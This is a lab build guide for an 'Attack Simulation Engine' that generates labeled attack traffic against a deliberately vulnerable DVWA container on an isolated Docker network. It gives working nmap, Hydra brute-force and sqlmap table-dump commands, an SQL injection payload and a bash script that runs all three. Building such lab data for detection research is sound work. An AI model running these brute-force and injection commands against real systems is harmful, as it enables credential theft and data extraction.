# Block 2: Attack Simulation Engine — Deep-Dive Implementation Guide

This document provides a comprehensive dissection and step-by-step implementation blueprint for **Block 2: Attack Simulation Engine** in ShadowNet.

---

## 1. Architectural Role & Objective

The Attack Simulation Engine simulates realistic adversary behavior against the Digital Twin (`10.10.0.10`) inside the isolated `twin-net` (`10.10.0.0/24`).

```
┌─────────────────────────────────────────────────────────────┐
│                   twin-net (10.10.0.0/24)                   │
│                       internal: true                        │
│                                                             │
│   ┌──────────────────┐               ┌──────────────────┐   │
│   │   shadownet-db   │               │  shadownet-dvwa  │   │
│   │   10.10.0.11     │◄─────────────►│  10.10.0.10      │   │
│   │   mysql:5.7      │               │  web-dvwa:80     │   │
│   └──────────────────┘               └────────▲─────────┘   │
│                                               │             │
│                                       Target  │ Attacks     │
│                                               │             │
│                                      ┌────────┴─────────┐   │
│                                      │shadownet-attacker│   │
│                                      │   10.10.0.20     │   │
│                                      │  (Kali / Debian) │   │
│                                      └──────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Objectives
1. Build and integrate the `shadownet-attacker` service into `docker-compose.yml` with fixed IP `10.10.0.20`.
2. Implement an automated wrapper that logs accurate ISO-8601 / UTC timestamps for each attack execution (`START` / `END`).
3. Execute and verify the three core simulated attacks:
   - **Reconnaissance:** Nmap Port & Service Discovery
   - **Credential Access:** Hydra Form Brute Force
   - **Web Exploitation:** sqlmap SQL Injection & Data Exfiltration

---

## 2. Component Files to Create

```
shadownet/
├── attacker/
│   ├── Dockerfile            <-- Container definition with security tools
│   ├── passwords.txt         <-- Compact wordlist for fast, deterministic brute force
│   └── run_attacks.sh        <-- Automated orchestrator with timestamp logger
├── logs/                     <-- Host mount for attack_log.txt & tool outputs
└── captures/                 <-- Host mount for network PCAP files
```

---

## 3. Dissecting the Implementation Components

### 3.1. The Attacker Dockerfile (`shadownet/attacker/Dockerfile`)

#### Design Decisions:
- **Base Image:** `debian:bookworm-slim` is recommended over `kalilinux/kali-rolling`. While Kali is popular, its Docker image is 2–3 GB, frequently experiences repository mirror timeouts, and contains heavy dependencies. Debian Bookworm includes the exact same stable upstream packages for `nmap`, `hydra`, `sqlmap`, and `tcpdump` while weighing under 350 MB fully installed.
- **Tools Included:**
  - `nmap`: Network mapping and service fingerprinting.
  - `hydra`: Fast parallel network login cracker.
  - `sqlmap`: Automated SQL injection testing tool.
  - `tcpdump`: Packet analyzer (used in Block 3).
  - `curl` & `python3`: Used for fetching CSRF tokens and scripted orchestration.
  - `ca-certificates`, `iputils-ping`, `net-tools`: Network troubleshooting utilities.

```dockerfile
# shadownet/attacker/Dockerfile
FROM debian:bookworm-slim

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
    nmap \
    hydra \
    sqlmap \
    tcpdump \
    curl \
    python3 \
    iproute2 \
    net-tools \
    iputils-ping \
    ca-certificates \
    procps \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /root/attacks

# Ensure output directories exist
RUN mkdir -p /logs /captures /root/attacks/scripts

COPY passwords.txt /root/attacks/passwords.txt
COPY run_attacks.sh /root/attacks/run_attacks.sh
RUN chmod +x /root/attacks/run_attacks.sh

ENTRYPOINT ["/bin/bash"]
```

---

### 3.2. Curated Wordlist (`shadownet/attacker/passwords.txt`)

Do **not** use the full uncompressed `rockyou.txt` (14 million lines) inside Docker during attack simulation. Running 14 million attempts against DVWA's single-threaded Apache server will crash the container or take several days to finish. 

Create a realistic, small dictionary containing the actual target password (`password`) along with standard common passwords:

```text
123456
12345678
1234
qwerty
12345
dragon
pussy
baseball
football
letmein
monkey
shadow
master
admin
password
secret
superman
trustno1
```

---

### 3.3. Compose Integration (`shadownet/docker-compose.yml`)

Add the `attacker` service to the existing `shadownet/docker-compose.yml`:

```yaml
  attacker:
    build:
      context: ./attacker
      dockerfile: Dockerfile
    container_name: shadownet-attacker
    networks:
      twin-net:
        ipv4_address: 10.10.0.20
    volumes:
      - ./logs:/logs
      - ./captures:/captures
      - ./attacker/run_attacks.sh:/root/attacks/run_attacks.sh:ro
      - ./attacker/passwords.txt:/root/attacks/passwords.txt:ro
    depends_on:
      - dvwa
    cap_add:
      - NET_ADMIN
      - NET_RAW
    stdin_open: true
    tty: true
    restart: unless-stopped
```

> **Why `cap_add: [NET_ADMIN, NET_RAW]`?**
> Standard Docker containers drop low-level socket privileges. Adding `NET_RAW` and `NET_ADMIN` allows `nmap` (SYN scans `-sS`) and `tcpdump` (promiscuous raw packet capture) to operate without permission denial errors.

---

### 3.4. Deep Dive into the 3 Attacks

#### Attack A: Nmap Port & Service Scan
- **Objective:** Discover open ports, server versions, and running services on the digital twin.
- **Command:**
  ```bash
  nmap -sV -sT -p 1-1000 10.10.0.10 -oN /logs/nmap_results.txt
  ```
- **Flag Dissection:**
  - `-sT`: TCP Connect scan (safe inside containerized bridges).
  - `-sV`: Service version probing (interrogates port 80 to detect Apache 2.4.25 and PHP 7.0).
  - `-p 1-1000`: Scans top 1000 privileged ports (identifies port 80 open and port 3306 closed/unexposed on DVWA).
  - `-oN /logs/nmap_results.txt`: Saves human-readable scan output to the persistent logs directory.

---

#### Attack B: Hydra HTTP Form Brute Force
- **Target URL Path:** `http://10.10.0.10/vulnerabilities/brute/` or `http://10.10.0.10/login.php`
- **Important Gotcha: URL Paths in DVWA Docker:**
  - The web root in the container is `/var/www/html/`. The path is **`/login.php`**, **not** `/dvwa/login.php`.
  - The login form on `/login.php` contains an anti-CSRF token (`user_token`).
  - DVWA includes a dedicated brute-force training module at `/vulnerabilities/brute/` which tests authentication over HTTP GET with `security=low`:
    `http://10.10.0.10/vulnerabilities/brute/?username=^USER^&password=^PASS^&Login=Login`
- **Hydra Command (via DVWA Brute Module with authenticated session):**
  ```bash
  hydra -l admin -P /root/attacks/passwords.txt 10.10.0.10 http-get-form \
    "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=$SESSION_ID; security=low:F=username and/or password incorrect" \
    -vV -o /logs/hydra_results.txt
  ```
- **Flag Dissection:**
  - `-l admin`: Target username.
  - `-P passwords.txt`: Password candidate dictionary.
  - `http-get-form`: DVWA brute module uses GET parameters for credential validation.
  - `H=Cookie\...`: Passes the active PHP session ID and security level `low`.
  - `F=username and/or password incorrect`: The failure condition string that tells Hydra a login attempt failed.
  - `-o /logs/hydra_results.txt`: Writes the cracked credential pair (`admin:password`) to disk.

---

#### Attack C: sqlmap Automated SQL Injection
- **Target URL:** `http://10.10.0.10/vulnerabilities/sqli/?id=1&Submit=Submit`
- **Vulnerability Mechanics:** Under `security=low`, DVWA executes:
  ```php
  $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
  ```
  Since input is not sanitized or parameterized, `id=1' OR '1'='1` dumps all database users.
- **Command:**
  ```bash
  sqlmap -u "http://10.10.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" \
    --cookie="PHPSESSID=$SESSION_ID; security=low" \
    --batch \
    --dump -T users -D dvwa \
    --output-dir=/logs/sqlmap_out
  ```
- **Flag Dissection:**
  - `-u "..."`: Target vulnerable GET endpoint.
  - `--cookie="..."`: Session cookies to bypass authentication and enforce low security.
  - `--batch`: Runs non-interactively, accepting default options for prompts.
  - `--dump -T users -D dvwa`: Enumerates the `dvwa` schema and dumps the `users` table via injected SQL payloads.
  - `--output-dir=...`: Persists discovered vulnerabilities, HTTP requests, and extracted data to host-mounted `/logs`.

---

### 3.5. Automated Timestamp Wrapper (`shadownet/attacker/run_attacks.sh`)

The labeling pipeline in Block 3 requires deterministic ground-truth time windows formatted in standard ISO-8601 UTC.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOG_FILE="/logs/attack_log.txt"
TARGET_IP="10.10.0.10"
PASSWORDS_FILE="/root/attacks/passwords.txt"

# Helper for UTC ISO-8601 timestamps
timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

log_event() {
    local action="$1"
    local attack="$2"
    local ts
    ts=$(timestamp)
    echo "${action} ${attack} ${ts}" | tee -a "$LOG_FILE"
}

echo "=== Initializing Attack Simulation Engine ==="
mkdir -p /logs /captures

# 1. Obtain Authenticated Session Cookie from DVWA
echo "[+] Logging in to DVWA to acquire authenticated session cookie..."
LOGIN_HTML=$(curl -s "http://${TARGET_IP}/login.php")
USER_TOKEN=$(echo "$LOGIN_HTML" | grep -oP "name='user_token' value='\K[a-f0-9]+" || true)
PHPSESSID=$(curl -s -i "http://${TARGET_IP}/login.php" | grep -oP "PHPSESSID=\K[^;]+" | head -n 1 || true)

if [ -z "$PHPSESSID" ]; then
    # Fallback if first request didn't return cookie
    PHPSESSID=$(curl -s -c - "http://${TARGET_IP}/login.php" | grep "PHPSESSID" | awk '{print $7}')
fi

# Submit credentials
curl -s -b "PHPSESSID=${PHPSESSID}; security=low" \
     -d "username=admin&password=password&Login=Login&user_token=${USER_TOKEN}" \
     "http://${TARGET_IP}/login.php" > /dev/null

echo "[+] Authenticated session established: PHPSESSID=${PHPSESSID}"
sleep 2

# ----------------------------------------------------
# Attack 1: Nmap Service & Port Scan
# ----------------------------------------------------
log_event "START" "nmap_scan"
echo "[+] Running Nmap scan against ${TARGET_IP}..."
nmap -sV -sT -p 1-1000 "${TARGET_IP}" -oN /logs/nmap_results.txt
log_event "END" "nmap_scan"

sleep 5  # Inter-attack cooldown for distinct network boundary

# ----------------------------------------------------
# Attack 2: Hydra Form Brute Force
# ----------------------------------------------------
log_event "START" "hydra_bruteforce"
echo "[+] Running Hydra brute force against DVWA..."
hydra -l admin -P "${PASSWORDS_FILE}" "${TARGET_IP}" http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=${PHPSESSID}; security=low:F=username and/or password incorrect" \
  -vV -o /logs/hydra_results.txt || true
log_event "END" "hydra_bruteforce"

sleep 5  # Inter-attack cooldown

# ----------------------------------------------------
# Attack 3: sqlmap SQL Injection & Data Dump
# ----------------------------------------------------
log_event "START" "sqlmap_sqli"
echo "[+] Running sqlmap against DVWA SQLi endpoint..."
sqlmap -u "http://${TARGET_IP}/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${PHPSESSID}; security=low" \
  --batch \
  --dump -T users -D dvwa \
  --output-dir=/logs/sqlmap_out || true
log_event "END" "sqlmap_sqli"

echo "=== Attack Simulation Completed Successfully ==="
echo "[+] Log summary stored in ${LOG_FILE}:"
cat "$LOG_FILE"
```

---

## 4. Execution & Step-by-Step Verification

### Step 1: Create Files on Host
Place `Dockerfile`, `passwords.txt`, and `run_attacks.sh` into `shadownet/attacker/`.

### Step 2: Build & Start the Attacker Service
```bash
cd shadownet
docker compose up -d --build attacker
```

### Step 3: Execute the Simulation Script
```bash
docker exec -it shadownet-attacker /root/attacks/run_attacks.sh
```

### Step 4: Verify Ground Truth Output
Check `shadownet/logs/attack_log.txt` on the host:
```text
START nmap_scan 2026-10-05T01:10:00Z
END nmap_scan 2026-10-05T01:10:15Z
START hydra_bruteforce 2026-10-05T01:10:20Z
END hydra_bruteforce 2026-10-05T01:10:26Z
START sqlmap_sqli 2026-10-05T01:10:31Z
END sqlmap_sqli 2026-10-05T01:10:48Z
```

Confirm evidence files were generated:
- `shadownet/logs/nmap_results.txt` (shows Port 80 Open, Apache 2.4)
- `shadownet/logs/hydra_results.txt` (shows `[80][http-get-form] host: 10.10.0.10   login: admin   password: password`)
- `shadownet/logs/sqlmap_out/` (contains dumped table `users.csv`)
